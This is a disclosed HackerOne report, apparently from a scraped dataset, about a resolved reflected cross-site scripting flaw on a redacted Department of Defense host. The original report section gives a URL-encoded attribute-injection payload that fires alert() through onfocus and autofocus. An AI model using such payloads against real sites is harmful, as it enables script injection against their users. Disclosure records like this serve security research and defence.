---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1252229'
original_report_id: '1252229'
title: XSS on https://███████/██████████ parameter
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2021-07-06T06:57:41.621Z'
disclosed_at: '2022-04-07T19:57:11.632Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS on https://███████/██████████ parameter

## Metadata

- HackerOne Report ID: 1252229
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2022-04-07T19:57:11.632Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

PoC
```
https://███████/███
```
Pameter 'xxslots' must be invalid
Payload ```xss%22%20tabindex%3d1%20autofocus%20onfocus%3d%22alert()```
███████

## Impact

XSS on https://███████/

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Go to ```XSS on https://██████/██████████```

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
